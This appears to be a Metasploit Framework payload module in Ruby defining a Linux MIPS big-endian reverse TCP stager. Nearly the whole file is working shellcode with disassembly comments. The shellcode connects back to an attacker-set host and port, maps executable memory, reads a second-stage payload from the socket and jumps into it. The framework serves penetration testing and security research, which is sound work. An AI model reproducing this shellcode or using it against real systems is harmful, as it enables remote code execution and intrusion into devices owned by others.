##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'


module MetasploitModule

  CachedSize = 272

  include Msf::Payload::Stager
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse TCP Stager',
      'Description'   => 'Connect back to the attacker',
      'Author'        =>
        [
          'juan vazquez',
          'tkmru'
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_MIPSBE,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Stager'        =>
        {
          'Offsets' =>
            {
              'LHOST' => [ [66, 70], 'ADDR16MSB' ],
              'LPORT' => [ 58, 'n' ],
            },
          'Payload' =>
            "\x24\x0f\xff\xfa" +  #  li  t7,-6
            "\x01\xe0\x78\x27" +  #  nor t7,t7,zero
            "\x21\xe4\xff\xfd" +  #  addi    a0,t7,-3
            "\x21\xe5\xff\xfd" +  #  addi    a1,t7,-3
            "\x28\x06\xff\xff" +  #  slti    a2,zero,-1
            "\x24\x02\x10\x57" +  #  li  v0,4183
            # socket(PF_INET, SOCK_STREAM, IPPROTO_IP)
            "\x01\x01\x01\x0c" +  #  syscall 0x40404
            "\x00\x07\x80\x2a" +  #  slt s0,zero,a3
            "\x16\x00\x00\x36" +  #  bnez    s0,0x4006bc <failed>
            "\xaf\xa2\xff\xfc" +  #  sw  v0,-4(sp)
            "\x8f\xa4\xff\xfc" +  #  lw  a0,-4(sp)
            "\x24\x0f\xff\xfd" +  #  li  t7,-3
            "\x01\xe0\x78\x27" +  #  nor t7,t7,zero
            "\xaf\xaf\xff\xe0" +  #  sw  t7,-32(sp)
            "\x3c\x0e\x11\x5c" +  #  lui t6,0x115c
            "\xaf\xae\xff\xe4" +  #  sw  t6,-28(sp)
            "\x3c\x0e\x7f\x00" +  #  lui t6,0x7f00
            "\x35\xce\x00\x01" +  #  ori t6,t6,0x1
            "\xaf\xae\xff\xe6" +  #  sw  t6,-26(sp)
            "\x27\xa5\xff\xe2" +  #  addiu   a1,sp,-30
            "\x24\x0c\xff\xef" +  #  li  t4,-17
            "\x01\x80\x30\x27" +  #  nor a2,t4,zero
            "\x24\x02\x10\x4a" +  #  li  v0,4170
            # connect(sockfd, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.0.0.1")}, 16)
            "\x01\x01\x01\x0c" +  #  syscall 0x40404
            "\x00\x07\x80\x2a" +  #  slt s0,zero,a3
            "\x16\x00\x00\x25" +  #  bnez    s0,0x4006bc <failed>
            "\x24\x04\xff\xff" +  #  li  a0,-1
            "\x24\x05\x10\x01" +  #  li  a1,4097
            "\x20\xa5\xff\xff" +  #  addi    a1,a1,-1
            "\x24\x09\xff\xf8" +  #  li  t1,-8
            "\x01\x20\x48\x27" +  #  nor t1,t1,zero
            "\x01\x20\x30\x20" +  #  add a2,t1,zero
            "\x24\x07\x08\x02" +  #  li  a3,2050
            "\x24\x0b\xff\xea" +  #  li  t3,-22
            "\x01\x60\x58\x27" +  #  nor t3,t3,zero
            "\x03\xab\x58\x20" +  #  add t3,sp,t3
            "\xad\x60\xff\xff" +  #  sw  zero,-1(t3)
            "\xad\x62\xff\xfb" +  #  sw  v0,-5(t3)
            "\x24\x02\x0f\xfa" +  #  li  v0,4090
            # mmap(0xffffffff, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
            "\x01\x01\x01\x0c" +  #  syscall 0x40404
            "\x00\x07\x80\x2a" +  #  slt s0,zero,a3
            "\x16\x00\x00\x15" +  #  bnez    s0,0x4006bc <failed>
            "\xaf\xa2\xff\xf8" +  #  sw  v0,-8(sp)
            "\x8f\xa4\xff\xfc" +  #  lw  a0,-4(sp)
            "\x8f\xa5\xff\xf8" +  #  lw  a1,-8(sp)
            "\x24\x06\x10\x01" +  #  li  a2,4097
            "\x20\xc6\xff\xff" +  #  addi    a2,a2,-1
            "\x24\x02\x0f\xa3" +  #  li  v0,4003
            # read(sockfd, addr, 4096)
            "\x01\x01\x01\x0c" +  #  syscall 0x40404
            "\x00\x07\x80\x2a" +  #  slt s0,zero,a3
            "\x16\x00\x00\x0c" +  #  bnez    s0,0x4006bc <failed>
            "\x8f\xa4\xff\xf8" +  #  lw  a0,-8(sp)
            "\x00\x40\x28\x20" +  #  add a1,v0,zero
            "\x24\x09\xff\xfd" +  #  li  t1,-3
            "\x01\x20\x48\x27" +  #  nor t1,t1,zero
            "\x01\x20\x30\x20" +  #  add a2,t1,zero
            "\x24\x02\x10\x33" +  #  li  v0,4147
            # cacheflush(addr, nbytes, DCACHE)
            "\x01\x01\x01\x0c" +  #  syscall 0x40404
            "\x00\x07\x80\x2a" +  #  slt s0,zero,a3
            "\x16\x00\x00\x03" +  #  bnez    s0,0x4006bc <failed>
            "\x8f\xb1\xff\xf8" +  #  lw  s1,-8(sp)
            "\x8f\xb2\xff\xfc" +  #  lw  s2,-4(sp)
            "\x02\x20\xf8\x09" +  #  jalr    s1
            # 4006bc <failed>:
            "\x24\x04\x00\x01" +  #  li	a0,1
            "\x24\x02\x0f\xa1" +  #  li	v0,4001
            # exit(status)
            "\x01\x01\x01\x0c" +  #  syscall	0x40404
            "\x00\x20\x08\x25" +  #  move	at,at
            "\x00\x20\x08\x25"    #  move	at,at
        }
      ))
  end
end
